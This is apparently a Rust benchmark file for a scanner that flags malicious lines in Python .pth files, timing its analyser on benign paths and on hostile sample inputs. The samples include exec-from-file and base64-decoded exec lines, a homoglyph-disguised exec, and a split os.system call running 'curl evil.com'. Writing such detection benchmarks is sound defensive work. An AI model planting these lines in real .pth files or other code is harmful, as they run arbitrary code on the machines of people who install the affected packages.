#![allow(clippy::unwrap_used, clippy::expect_used)]

use criterion::{black_box, criterion_group, criterion_main, Criterion};
use sanctum_sentinel::pth::analyser::{analyse_pth_file, analyse_pth_line};

fn bench_analyse_line_benign(c: &mut Criterion) {
    c.bench_function("analyse_pth_line/benign_path", |b| {
        b.iter(|| analyse_pth_line(black_box("/usr/lib/python3.12/dist-packages/pkg")));
    });
}

fn bench_analyse_line_comment(c: &mut Criterion) {
    c.bench_function("analyse_pth_line/comment", |b| {
        b.iter(|| analyse_pth_line(black_box("# This is a comment line")));
    });
}

fn bench_analyse_line_warning_import(c: &mut Criterion) {
    c.bench_function("analyse_pth_line/warning_import", |b| {
        b.iter(|| analyse_pth_line(black_box("import pkg_resources")));
    });
}

fn bench_analyse_line_critical_exec(c: &mut Criterion) {
    c.bench_function("analyse_pth_line/critical_exec", |b| {
        b.iter(|| {
            analyse_pth_line(black_box(
                "exec(compile(open('/tmp/payload.py').read(), '<string>', 'exec'))",
            ))
        });
    });
}

fn bench_analyse_line_critical_base64(c: &mut Criterion) {
    c.bench_function("analyse_pth_line/critical_base64", |b| {
        b.iter(|| {
            analyse_pth_line(black_box(
                r#"import base64;exec(base64.b64decode("aW1wb3J0IG9z..."))"#,
            ))
        });
    });
}

fn bench_analyse_line_homoglyph(c: &mut Criterion) {
    // Cyrillic e (\u{0435}) instead of Latin e in "exec("
    c.bench_function("analyse_pth_line/homoglyph_exec", |b| {
        b.iter(|| analyse_pth_line(black_box("\u{0435}xec(payload)")));
    });
}

fn bench_analyse_file_safe(c: &mut Criterion) {
    let content = (0..20)
        .map(|i| format!("/usr/lib/python3.12/dist-packages/pkg{i}"))
        .collect::<Vec<_>>()
        .join("\n");

    c.bench_function("analyse_pth_file/safe_20_lines", |b| {
        b.iter(|| analyse_pth_file(black_box(&content)));
    });
}

fn bench_analyse_file_mixed(c: &mut Criterion) {
    let mut lines: Vec<String> = (0..18)
        .map(|i| format!("/usr/lib/python3.12/dist-packages/pkg{i}"))
        .collect();
    lines.push("import pkg_resources".to_string());
    lines.push("exec(compile(open('/tmp/payload.py').read(), '<string>', 'exec'))".to_string());
    let content = lines.join("\n");

    c.bench_function("analyse_pth_file/mixed_20_lines", |b| {
        b.iter(|| analyse_pth_file(black_box(&content)));
    });
}

fn bench_analyse_file_continuation(c: &mut Criterion) {
    let content = "os.sy\\\nstem('curl evil.com')\n/usr/lib/python3.12/dist-packages/pkg\n";

    c.bench_function("analyse_pth_file/continuation_lines", |b| {
        b.iter(|| analyse_pth_file(black_box(content)));
    });
}

criterion_group!(
    benches,
    bench_analyse_line_benign,
    bench_analyse_line_comment,
    bench_analyse_line_warning_import,
    bench_analyse_line_critical_exec,
    bench_analyse_line_critical_base64,
    bench_analyse_line_homoglyph,
    bench_analyse_file_safe,
    bench_analyse_file_mixed,
    bench_analyse_file_continuation,
);
criterion_main!(benches);
